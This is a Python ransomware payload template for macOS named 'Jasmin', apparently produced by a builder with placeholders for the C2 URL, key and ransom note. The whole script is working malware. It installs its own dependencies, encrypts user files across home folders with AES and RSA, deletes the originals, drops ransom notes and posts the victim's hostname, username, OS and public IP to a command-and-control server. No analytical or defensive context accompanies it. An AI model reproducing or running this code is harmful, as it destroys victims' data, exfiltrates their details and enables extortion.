#!/usr/bin/env python3
# Jasmin macOS Payload — Auto-generated
import os,sys,subprocess
def _dep():
    try:
        import cryptography; return
    except ImportError: pass
    try:
        subprocess.run([sys.executable,'-m','ensurepip','--default-pip'],capture_output=True)
    except: pass
    for cmd in [
        [sys.executable,'-m','pip','install','-q','--user','cryptography'],
        [sys.executable,'-m','pip','install','-q','cryptography'],
        ['pip3','install','-q','--user','cryptography'],
        ['pip3','install','-q','cryptography'],
    ]:
        try:
            r=subprocess.run(cmd,capture_output=True,timeout=120)
            if r.returncode==0:
                import cryptography; return
        except: continue
    try:
        import urllib.request,tempfile
        gp=os.path.join(tempfile.gettempdir(),'get-pip.py')
        urllib.request.urlretrieve('https://bootstrap.pypa.io/get-pip.py',gp)
        subprocess.run([sys.executable,gp,'--user','-q'],capture_output=True,timeout=120)
        subprocess.run([sys.executable,'-m','pip','install','-q','--user','cryptography'],capture_output=True,timeout=120)
        os.remove(gp)
        import cryptography; return
    except: pass
    print('[!] 无法自动安装cryptography，请手动: pip3 install cryptography'); sys.exit(1)
_dep()
import struct,hashlib,socket,platform,datetime,urllib.request,json
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
from cryptography.hazmat.primitives.asymmetric import padding as ap
from cryptography.hazmat.primitives import hashes,serialization
from cryptography.hazmat.backends import default_backend

C2='{{C2_URL}}'
SECRET='{{HANDSHAKE}}'
RSA_PUB=b"""{{RSA_PUBLIC_KEY}}"""

SKIP_DIRS=frozenset(['/System','/Library','/usr','/bin','/sbin','/dev','/private/var/db','/Volumes/Recovery'])
EXTS={'.pptx','.docx','.xlsx','.txt','.pdf','.csv','.jpg','.jpeg','.png','.zip','.rar','.7z','.mp3','.mp4','.sql','.bak','.html','.php','.py','.java','.json','.xml','.yaml','.md','.pages','.numbers','.keynote'}
NOTE='READ_ME_解密教程.txt'

def skip(p):
    fp=os.path.abspath(p)
    if fp.endswith('.jasmin') or os.path.basename(fp).startswith('READ_ME_'):return True
    for d in SKIP_DIRS:
        if fp.startswith(d+'/'):return True
    if '/.ssh/' in fp:return True
    _,e=os.path.splitext(fp)
    return e.lower() not in EXTS

def pad(d):
    n=16-(len(d)%16);return d+bytes([n]*n)

def encrypt(path,pub):
    if skip(path):return False
    try:
        p=open(path,'rb').read()
        if not p:return False
        h=hashlib.sha256(p).digest()
        k,iv=os.urandom(32),os.urandom(16)
        c=Cipher(algorithms.AES(k),modes.CBC(iv),default_backend()).encryptor()
        ct=c.update(pad(p))+c.finalize()
        ek=pub.encrypt(k+iv,ap.OAEP(mgf=ap.MGF1(hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
        with open(path+'.jasmin','wb') as f:
            f.write(h);f.write(ct);f.write(ek);f.write(struct.pack('<I',len(ek)))
        os.remove(path);return True
    except:return False

RANSOM_TXT="""
{{RANSOM_NOTE}}
"""

def get_sid():
    try:return hex(os.getuid())+'-'+socket.gethostname()
    except:return 'unknown'

def drop_notes(sid):
    txt=RANSOM_TXT.replace('{sid}',sid)
    home=os.path.expanduser('~')
    for d in [home,os.path.join(home,'Desktop'),os.path.join(home,'Documents'),'/tmp','/Users']:
        try:
            if os.path.isdir(d):open(os.path.join(d,NOTE),'w').write(txt)
        except:pass

def beacon(sid):
    try:
        d={'handshake':SECRET,'machine_name':socket.gethostname(),'computer_user':os.getenv('USER','?'),
           'os':f'macOS {platform.mac_ver()[0]}','date':datetime.datetime.now().strftime('%d/%m/%Y, %A'),
           'time':datetime.datetime.now().strftime('%H:%M:%S'),'ip':'0.0.0.0','location':'?',
           'systemid':sid,'password':'RSA_PROTECTED'}
        try:d['ip']=urllib.request.urlopen('https://api.ipify.org',timeout=5).read().decode()
        except:pass
        req=urllib.request.Request(C2,data=urllib.parse.urlencode(d).encode(),method='POST')
        urllib.request.urlopen(req,timeout=10)
    except:pass

def main():
    pub=serialization.load_pem_public_key(RSA_PUB,default_backend())
    sid=get_sid()
    beacon(sid)
    n=0
    for r in [os.path.expanduser('~'),'/Users','/tmp','/var/tmp']:
        if not os.path.isdir(r):continue
        for dp,_,fs in os.walk(r):
            for f in fs:
                if encrypt(os.path.join(dp,f),pub):n+=1
    drop_notes(sid)

if __name__=='__main__':main()
